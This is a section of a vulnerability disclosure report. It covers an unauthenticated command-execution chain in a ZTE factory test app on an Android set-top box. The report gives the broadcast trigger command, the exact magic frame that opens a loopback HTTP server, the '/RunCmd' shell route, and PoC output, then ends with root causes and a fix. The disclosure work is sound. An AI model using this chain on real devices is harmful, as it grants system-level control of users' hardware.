# 02 — OEM factory service: unauthenticated command execution (uid 1000)

Component: `com.zte.factorytesttool` (`/system/app/FactoryTestTool/FactoryTestTool.apk`).
Runs with shared uid `android.uid.system` (uid 1000), SELinux domain `system_app`.

## 2.1 Exported broadcast starts the component

`AndroidManifest.xml` declares receiver `TestToolBroadcast` as exported with:

```
android.intent.action.BOOT_COMPLETED
com.zte.stb.StartHWTest
com.zte.stb.StartAutoTest
com.zte.stb.Activity2Front
```

Handler `TestToolBroadcast.b(Context)` (~line 94) starts the service and the UI without validating the
caller:

```java
context.startService(new Intent(context, MyService.class)
        .setAction("com.zte.stb.StartHWTest"));
CommonFunc.b(context);            // startActivity(FactoryTest.class, FLAG_ACTIVITY_NEW_TASK)
```

Any local app can trigger it:

```sh
am broadcast -a com.zte.stb.StartHWTest
```

Verified: `dumpsys activity activities` shows
`mResumedActivity: com.zte.factorytesttool/.FactoryTest` after the broadcast, on a device with the
factory UI not previously open.

## 2.2 Starting the HTTP server (:10001)

`STBFactoryTool.Test.HTTPServer` is instantiated only from `FactoryTest.am()`, triggered by a socket
command with `payload[3] == 0xFF`:

```java
private void am() {                         // "OpenHttpServer"
    if (MyApp.B[3] != -1) { return; }        // 0xFF == -1
    if (CommonFunc.b("sys.tool.apk.httpserver.status", "0").indexOf("1") != 0) {
        new HTTPServer(this).start();        // binds 127.0.0.1:10001
        CommonFunc.c("sys.tool.apk.httpserver.status", "1");
    }
}
```

Wire format accepted by `MyService` (TCP/10044): 46 bytes

```
7e 01 2c ff 00 00 ... 00 7e
|-- header --|-- 43 x 00 --| end
```

`MyService` buffers are 48/2000 bytes (`SocketChannel`, non-blocking select loop);
logcat tag `FTT` shows `select return 1` / `new Connection : /127.0.0.1`.

## 2.3 HTTP API

| Route | JSON body (`dictData`) | Effect |
|-------|------------------------|--------|
| `POST /RunCmd` | `{"shellCmd":"…","requestRst":"true"}` | runs `sh -c` as uid 1000, returns stdout in `shellCmdRst` |
| `GET /PutFile` | `{"filePath":"/path"}` | returns file contents if readable by uid 1000 |
| `GET /GetFile` | — | file upload |
| `GET/Set /GetProp`, `/SetProp` | `{"propName","propValue"}` | `getprop`/`setprop` |
| `GET/Set /GetConfig`, `/SetConfig` | `{"cfgSection","cfgKey","cfgValue"}` | OEM STBCFG configuration |
| `/ControlLed` | — | front-panel LED |

Request handling is unauthenticated; the server binds loopback only.

## 2.4 PoC

```console
$ python3 poc/00_magic_frame.py           # opens :10001
$ python3 poc/01_run_cmd.py 'id'
uid=1000(system) gid=1000(system) groups=1000(system),1007(log),1065(reserved_disk),
1077(external_storage),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),
3007(net_bw_acct),9997(everybody) context=u:r:system_app:s0
```

Diagram: [`docs/img/chain.svg`](img/chain.svg)

## 2.5 Capabilities obtained as uid 1000

Measured on the affected build:

| Operation | Result |
|-----------|--------|
| write `/cache`, `/cache/recovery` | yes (`install -m 0755`, `touch`) |
| `cmd appops set <pkg> REQUEST_INSTALL_PACKAGES allow` | yes |
| `pm install -r /sdcard/x.apk` | yes |
| `svc power reboot` | yes |
| `am broadcast` to system-protected receivers | yes |
| read `/vendor/firmware/*`, `/dev/block/*` | no (SELinux: list only) |
| `settings put global/secure …` | no (SecurityException) |
| `mkdir /cache`, `/metadata`, `/mnt/vendor/*` | no |

## 2.6 Root cause

- Exported receiver with no permission check and no signature-level guard.
- Service startable from an unprivileged app (`startService` on an explicit component).
- Loopback "factory" server that exposes shell execution without authentication or attestation.

Fix: mark the receiver `android:exported="false"` (or protect with a signature permission), require a
caller check in `TestToolBroadcast`, and gate `/RunCmd` behind authentication/attestation.
